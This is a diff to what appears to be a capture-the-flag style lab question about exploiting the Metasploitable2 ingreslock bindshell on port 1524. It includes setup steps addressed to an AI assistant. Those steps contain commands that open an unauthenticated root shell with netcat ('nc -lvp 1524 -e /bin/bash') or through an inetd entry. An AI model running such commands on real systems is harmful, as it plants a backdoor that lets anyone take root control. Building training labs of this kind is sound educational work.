@@ -5,7 +5,7 @@
 | **Target** | `192.168.52.129` / `192.168.52.130` |
 | **Domain** | 05 — System Hacking |
 | **Difficulty** | 🟡 Medium |
-| **Tools** | `metasploit`, `hydra`, `john`, `hashcat`, `linpeas`, `mimikatz` |
+| **Tools** | `nc (netcat)` |
 | **Time budget** | 15–25 min |
 
 ---
@@ -66,9 +66,10 @@ Direct root shell — pre-installed.
 ## 🤖 Claude Setup Prompt (for Claude-on-your-PC)
 
 ```
-1. Verify VMs running: ping 192.168.52.129 and ping 192.168.52.130 from 192.168.52.128.
-2. Required services for this Q already up by default on the relevant target.
-3. If something is down, restart it on the target VM.
+Pre-requisites for Q061:
+1. Verify Metasploitable2 (192.168.52.129) up; ingreslock/bindshell process on port 1524 active: ssh msfadmin@192.168.52.129 → ps aux | grep 1524 (Metasploitable2 spawns /bin/sh on 1524 via inetd by default).
+2. If not listening: ssh msfadmin, sudo nc -lvp 1524 -e /bin/bash & (or enable in /etc/inetd.conf: ingreslock stream tcp nowait root /bin/bash).
+3. From Parrot: nc -v 192.168.52.129 1524 must succeed.
 
-Report back: "Lab ready for Q061".
+Report back: "Lab ready for Q061 — bindshell listening on 192.168.52.129:1524".
 ```
